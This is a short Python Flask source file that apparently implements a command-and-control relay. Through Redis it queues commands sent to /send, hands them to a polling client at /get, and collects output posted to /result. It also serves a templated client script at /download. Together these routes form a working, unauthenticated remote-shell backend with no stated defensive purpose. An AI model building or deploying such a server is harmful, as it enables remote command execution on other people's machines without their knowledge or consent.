from flask import Flask,request,render_template
import redis
import os

#from flask_caching import Cache
import time
app = Flask(__name__)
#cache = Cache(config={'CACHE_TYPE': 'SimpleCache'})
#cache.init_app(app)

#KV_URL=os.environ.get('KV_URL').replace("redis","rediss") #tls support
REDIS_URL=os.environ.get('REDIS_URL')
DOMAIN_NAME=os.environ.get('DOMAIN_NAME')

#r = redis.Redis.from_url( KV_URL )
r = redis.Redis.from_url(REDIS_URL)

def setkey(key,value):
    r.set(key,value)


def getkey(key):
    return r.get(key)

@app.route('/')
def help():
    return '''
usage: <br>
/get <br>
/send?cmd=xxx<br>
/result?res=xxx <br>
/download
'''



@app.route('/get')
def get():
    response =None
    #response =  cache.get('command')
    response=getkey('command')
    setkey("command","")
    return response or ""

@app.route('/send')
def send():
    result=None
    cmd = request.args.get('cmd','')
    if cmd == '':
        return 'Please input command in format:http://url/send?cmd=xxx'
    #cache.set('command', cmd)
    setkey('command',cmd)
    result=getkey('result')
    while result == None or result == b'':
        result=getkey('result')
        print(result)
        pass
    setkey("result","")
    #while cache.get('result') == None:
    #   time.sleep(5)
    #    print(cache.get('result'))
    #    pass
    #response=cache.get('result')
    #cache.set('result', '')
    print(result)
    return result

@app.route('/result')
def result():
    res = request.args.get('res','')
    if res == '':
        return 'Please input command in format:http://url/result?res=xxx'
    setkey('result',res)
    return 'ok'



@app.route('/download')
def download():
    return render_template('client.py', DOMAIN_NAME=DOMAIN_NAME)
